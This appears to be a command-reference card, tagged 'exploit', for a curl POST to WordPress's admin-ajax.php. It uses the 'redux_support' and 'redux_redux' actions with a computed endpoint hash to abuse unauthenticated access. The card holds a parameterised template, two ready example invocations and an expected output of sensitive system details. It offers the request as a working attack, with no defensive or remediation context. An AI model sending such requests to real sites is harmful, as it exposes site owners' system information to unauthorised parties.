---
data: >-
  curl -X POST '$1' -d 'action=$2&endpoint=$3' -H 'Content-Type:
  application/x-www-form-urlencoded'
tags:
  - http
  - exploit
  - ajax
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.936Z'
id: 01d7443f-54f4-4704-a0e3-e24381dbdbad
verified: false
validated: true
submitted: true
---
# Curl AJAX Request

## Command

```bash
curl -X POST '$1' -d 'action=$2&endpoint=$3' -H 'Content-Type: application/x-www-form-urlencoded'
```

## Description

This command sends a POST request to a WordPress AJAX endpoint to exploit unauthenticated access, using action and endpoint parameters derived from MD5 hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$1` | Target URL (e.g., https://example.com/wp-admin/admin-ajax.php) | Yes |
| `$2` | Action name (e.g., redux_support) | Yes |
| `$3` | Computed endpoint hash | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://example.com/wp-admin/admin-ajax.php' -d 'action=redux_support&endpoint=a1b2c3d4' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Advanced Usage

```bash
curl -X POST 'https://example.com/wp-admin/admin-ajax.php' -d 'action=redux_redux&endpoint=computed_hash' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

## Expected Output

Response body with sensitive information (e.g., JSON system details) or error if endpoint invalid.

## Related

- [[Related Procedure]]
